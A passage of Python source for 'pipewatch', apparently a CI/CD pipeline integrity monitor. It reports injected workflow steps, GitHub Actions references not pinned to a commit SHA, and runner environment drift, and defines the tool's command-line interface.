                loc, f"baseline={c.baseline_fp}  current={c.current_fp}{preview}"))
        elif c.status == "added":
            out.append(_finding(f"PW-STEP-{i:03d}", "HIGH", "step_fingerprint",
                f"New step injected: {loc}",
                f"Step {c.step_index} in '{c.job}' of '{c.path}' did not exist at baseline.",
                loc, f"fingerprint={c.current_fp}{preview}"))
        else:
            out.append(_finding(f"PW-STEP-{i:03d}", "MEDIUM", "step_fingerprint",
                f"Step removed: {loc}",
                f"Step {c.step_index} in '{c.job}' of '{c.path}' was removed since baseline.",
                loc, f"baseline_fp={c.baseline_fp}{preview}"))
    return out


def _findings_from_pinning(pinning: list[PinningFinding]) -> list[dict]:
    """One finding per unique action reference, listing all affected files and step count."""
    # Group by uses_ref so actions/checkout@v3 across 16 files → one finding.
    grouped: dict[str, list[PinningFinding]] = {}
    for p in pinning:
        grouped.setdefault(p.uses_ref, []).append(p)

    out = []
    for i, (ref, instances) in enumerate(sorted(grouped.items()), 1):
        affected_files = sorted(set(p.path for p in instances))
        step_count = len(instances)
        file_count = len(affected_files)
        action = ref.split("@")[0] if "@" in ref else ref
        tag = ref.split("@")[1] if "@" in ref else "unversioned"
        file_list = ", ".join(affected_files[:5])
        if file_count > 5:
            file_list += f" … and {file_count - 5} more"
        out.append(_finding(
            f"PW-PIN-{i:03d}", "MEDIUM", "unpinned_dependency",
            f"Unpinned action: {ref}",
            f"'{ref}' is not pinned to a commit SHA — mutable tags can be silently "
            "overwritten by a supply-chain attacker. "
            f"Found in {step_count} step(s) across {file_count} file(s).",
            file_list,
            f"fix: uses: {action}@<sha>  # {tag}\n"
            f"  https://github.com/{action}/commits",
        ))
    return out


def _findings_from_env(diff: EnvDiff) -> list[dict]:
    out, i = [], 1
    for var, val in diff.new_vars.items():
        out.append(_finding(f"PW-ENV-{i:03d}", "MEDIUM", "runner_environment",
            f"New environment variable: {var}",
            f"'{var}' present now but absent at baseline.",
            "runner", f"{var}={val[:80]}")); i += 1
    for var in diff.removed_vars:
        out.append(_finding(f"PW-ENV-{i:03d}", "LOW", "runner_environment",
            f"Environment variable removed: {var}", f"'{var}' absent now, present at baseline.",
            "runner")); i += 1
    for var, (old, new) in diff.changed_vars.items():
        out.append(_finding(f"PW-ENV-{i:03d}", "MEDIUM", "runner_environment",
            f"Environment variable changed: {var}",
            f"'{var}' changed — PATH changes can redirect tool execution.",
            "runner", f"baseline='{old[:60]}'  current='{new[:60]}'")); i += 1
    for tool in diff.new_tools:
        out.append(_finding(f"PW-ENV-{i:03d}", "LOW", "runner_environment",
            f"New tool present: {tool}", f"'{tool}' installed now, absent at baseline.",
            "runner")); i += 1
    for tool in diff.removed_tools:
        out.append(_finding(f"PW-ENV-{i:03d}", "LOW", "runner_environment",
            f"Tool removed: {tool}", f"'{tool}' absent now, present at baseline.",
            "runner")); i += 1
    for tool, (old, new) in diff.changed_tool_versions.items():
        out.append(_finding(f"PW-ENV-{i:03d}", "LOW", "runner_environment",
            f"Tool version changed: {tool}", f"'{tool}' changed version between runs.",
            "runner", f"baseline='{old}'  current='{new}'")); i += 1
    return out


def build_report(findings: list[dict], repo: str, baseline: Optional[str]) -> dict:
    counts = {s: 0 for s in _SEV_ORDER}
    for f in findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    return {
        "tool": "pipewatch", "version": __version__,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "repo": str(repo), "baseline_commit": baseline,
        "findings": sorted(findings, key=lambda x: _SEV_ORDER.get(x["severity"], 99)),
        "summary": {"total": len(findings), **counts},
    }


def print_report(report: dict, verbose: bool = False) -> None:
    print(f"\npipewatch {report['version']}  {report['timestamp']}")
    print(f"repo:     {report['repo']}")
    if report.get("baseline_commit"):
        print(f"baseline: {report['baseline_commit']}")
    print()
    if not report["findings"]:
        print("✓  No findings.\n")
        return
    for f in report["findings"]:
        sev = f["severity"]
        print(f"{_ANSI.get(sev, '')}[{sev}]{_ANSI['RESET']}  {f['id']}  {f['title']}")
        if verbose:
            print(f"         {f['description']}")
            if f.get("evidence"):
                print(f"         evidence: {f['evidence'][:120]}")
        print()
    s = report["summary"]
    print("─" * 60)
    print(
        f"total={s['total']}  CRITICAL={s['CRITICAL']}  HIGH={s['HIGH']}  "
        f"MEDIUM={s['MEDIUM']}  LOW={s['LOW']}  INFO={s['INFO']}\n"
    )


# ── CLI ───────────────────────────────────────────────────────────────────────

def _repo(path: str) -> Path:
    p = Path(path).resolve()
    if not (p / ".git").exists():
        sys.exit(f"error: {p} is not a git repository")
    return p


def _emit(report: dict, as_json: bool, verbose: bool) -> None:
    print(json.dumps(report, indent=2)) if as_json else print_report(report, verbose)


def cmd_baseline(args):
    repo = _repo(args.repo)
    commit = args.commit or git_head(repo)
    save_baseline(repo, commit)
    signed = bool(os.environ.get("PIPEWATCH_HMAC_KEY"))
    suffix = " (HMAC-signed)" if signed else " (unsigned — set PIPEWATCH_HMAC_KEY to enable signing)"
    print(f"baseline → {commit}{suffix}")


def cmd_scan(args):
    repo = _repo(args.repo)
    commit = load_baseline(repo, args.baseline)
    findings = (_findings_from_diffs(diff_pipeline_files(repo, commit))
                + _findings_from_steps(diff_fingerprints(repo, commit)))
    _emit(build_report(findings, repo, commit), args.json, args.verbose)
    sys.exit(1 if findings else 0)


def cmd_pin_audit(args):
    repo = _repo(args.repo)
    findings = _findings_from_pinning(audit_pinning(repo))
    if args.verify_shas:
        findings += verify_pinned_shas(repo, args.token or os.environ.get("GITHUB_TOKEN"))
    _emit(build_report(findings, repo, None), args.json, args.verbose)
    sys.exit(1 if findings else 0)


def cmd_static(args):
    repo = _repo(args.repo)
    findings = static_analysis(repo)
    _emit(build_report(findings, repo, None), args.json, args.verbose)
    sys.exit(1 if findings else 0)


def cmd_snapshot(args):
    snap = capture_snapshot()
    save_snapshot(snap, Path(args.output))
    print(f"snapshot → {args.output}")


def cmd_env_diff(args):
    base_snap = load_snapshot(Path(args.baseline_snapshot))
    cur_snap = load_snapshot(Path(args.current_snapshot)) if args.current_snapshot else capture_snapshot()
    findings = _findings_from_env(diff_snapshots(base_snap, cur_snap))
    _emit(build_report(findings, args.repo or ".", None), args.json, args.verbose)
    sys.exit(1 if findings else 0)


def cmd_audit(args):
    """Full audit: scan + pin-audit + static analysis."""
    repo = _repo(args.repo)
    commit = load_baseline(repo, args.baseline)
    findings = (
        _findings_from_diffs(diff_pipeline_files(repo, commit))
        + _findings_from_steps(diff_fingerprints(repo, commit))
        + _findings_from_pinning(audit_pinning(repo))
        + static_analysis(repo)
    )
    if args.verify_shas:
        findings += verify_pinned_shas(repo, args.token or os.environ.get("GITHUB_TOKEN"))
    _emit(build_report(findings, repo, commit), args.json, args.verbose)
    sys.exit(1 if findings else 0)


def cmd_init_runner(args):
    """Print a ready-to-paste GitHub Actions step block for runner environment monitoring."""
    snap = args.snapshot_path or ".pipewatch_env_snapshot.json"
    print(f"""
# Paste this into any job you want to monitor.
# Requires pipewatch to be installed in the runner environment.

      - name: Restore pipewatch snapshot
        uses: actions/cache@<sha>  # pin this
        with:
          path: {snap}
          key: pipewatch-env-${{{{ runner.os }}}}-${{{{ github.ref }}}}
          restore-keys: pipewatch-env-${{{{ runner.os }}}}-

      - name: pipewatch — runner environment check
        run: |
          pipewatch snapshot --output /tmp/pw_snap_current.json
          if [ -f "{snap}" ]; then
            pipewatch env-diff "{snap}" \\
              --current-snapshot /tmp/pw_snap_current.json \\
              --json >> $GITHUB_STEP_SUMMARY || true
          fi
          cp /tmp/pw_snap_current.json "{snap}"
""".strip())


def main():
    p = argparse.ArgumentParser(prog="pipewatch", description="CI/CD pipeline integrity monitor")
    p.add_argument("--version", action="version", version=f"pipewatch {__version__}")
    sub = p.add_subparsers(dest="command", required=True)

    def add(name, help_):
        return sub.add_parser(name, help=help_)

    def _repo_args(s, *, baseline_flag=False, sha_verify=False):
        """Add repo positional + --repo flag (positional wins if given)."""
        s.add_argument("repo_pos", nargs="?", default=None, metavar="REPO",
                       help="Repository path (positional shorthand for --repo)")
        s.add_argument("--repo", default=".", metavar="PATH")
        if baseline_flag:
            s.add_argument("--baseline", metavar="SHA")
        if sha_verify:
            s.add_argument("--verify-shas", action="store_true",
                           help="Verify pinned SHAs exist via GitHub API.")
            s.add_argument("--token", metavar="TOKEN", help="GitHub PAT (or set GITHUB_TOKEN).")

    def _resolve_repo(args) -> str:
        return args.repo_pos if args.repo_pos else args.repo

    # Patch cmd functions to resolve positional before calling _repo()
    _orig_scan = cmd_scan
    def cmd_scan_w(args):
        args.repo = _resolve_repo(args); _orig_scan(args)

    _orig_pin = cmd_pin_audit
    def cmd_pin_w(args):
        args.repo = _resolve_repo(args); _orig_pin(args)

    _orig_static = cmd_static
    def cmd_static_w(args):
        args.repo = _resolve_repo(args); _orig_static(args)

    _orig_audit = cmd_audit
    def cmd_audit_w(args):
        args.repo = _resolve_repo(args); _orig_audit(args)

    _orig_baseline = cmd_baseline
    def cmd_baseline_w(args):
        args.repo = _resolve_repo(args); _orig_baseline(args)

    s = add("baseline", "Record current (or specified) commit as known-good baseline.")
    _repo_args(s); s.add_argument("--commit", metavar="SHA")
    s.set_defaults(func=cmd_baseline_w)

    s = add("scan", "Diff pipeline files and step fingerprints against baseline.")
    _repo_args(s, baseline_flag=True)
    s.add_argument("--verbose", "-v", action="store_true"); s.add_argument("--json", action="store_true")
    s.set_defaults(func=cmd_scan_w)

    s = add("pin-audit", "Flag uses: references not pinned to a commit SHA.")
    _repo_args(s, sha_verify=True)
    s.add_argument("--verbose", "-v", action="store_true"); s.add_argument("--json", action="store_true")
    s.set_defaults(func=cmd_pin_w)

    s = add("static", "Static analysis: pull_request_target misuse, script injection, permissions, self-hosted runners, workflow_run chains.")
    _repo_args(s)
    s.add_argument("--verbose", "-v", action="store_true"); s.add_argument("--json", action="store_true")
    s.set_defaults(func=cmd_static_w)

    s = add("snapshot", "Capture runner environment to JSON.")
    s.add_argument("--output", default=_SNAPSHOT_FILE, metavar="FILE")
    s.set_defaults(func=cmd_snapshot)

    s = add("env-diff", "Diff two runner environment snapshots.")
    s.add_argument("baseline_snapshot"); s.add_argument("--current-snapshot", metavar="FILE")
    s.add_argument("--repo", default="."); s.add_argument("--verbose", "-v", action="store_true")
    s.add_argument("--json", action="store_true")
    s.set_defaults(func=cmd_env_diff)

    s = add("audit", "Full audit: scan + pin-audit + static analysis combined.")
    _repo_args(s, baseline_flag=True, sha_verify=True)
    s.add_argument("--verbose", "-v", action="store_true"); s.add_argument("--json", action="store_true")
    s.set_defaults(func=cmd_audit_w)

    s = add("init-runner", "Print a GitHub Actions step block for runner environment monitoring.")
    s.add_argument("--snapshot-path", metavar="PATH")
    s.set_defaults(func=cmd_init_runner)

    args = p.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()